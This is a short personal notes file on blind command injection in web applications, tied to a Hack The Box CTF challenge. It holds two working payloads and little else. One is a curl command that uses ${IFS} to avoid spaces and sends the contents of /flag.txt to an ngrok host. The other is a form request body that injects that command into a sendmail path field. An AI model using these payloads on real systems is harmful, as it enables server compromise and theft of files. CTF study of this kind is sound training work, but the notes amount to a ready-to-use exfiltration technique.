---
title: "Command Injection (Web)"
category: "web"
subcategory: "rce"
type: "technique"
tags: ["my-notes", "personal", "command-injection", "command", "injection", "web"]
summary: "Reference: https://github.com/hackthebox/hacktheboo-2024/tree/main/web/%5BVery%20Easy%5D%20Void%20Whispers#crafting-the-payload"
source:
  name: "Personal notes"
origin_path: "Web/Command Injection.md"
---

# Blind
```
curl${IFS}https://98ec-196-178-180-27.ngrok-free.app?x=$(cat${IFS}/flag.txt)
```

```
from=Ghostly+Support&email=support%40void-whispers.htb&sendMailPath=%2Fusr%2Fsbin%2Fsendmail;curl${IFS}https://98ec-196-178-180-27.ngrok-free.app?x=$(cat${IFS}/flag.txt)&mailProgram=sendmail'
```
**Reference:** https://github.com/hackthebox/hacktheboo-2024/tree/main/web/%5BVery%20Easy%5D%20Void%20Whispers#crafting-the-payload

---

*From your own notes: `Web/Command Injection.md`*
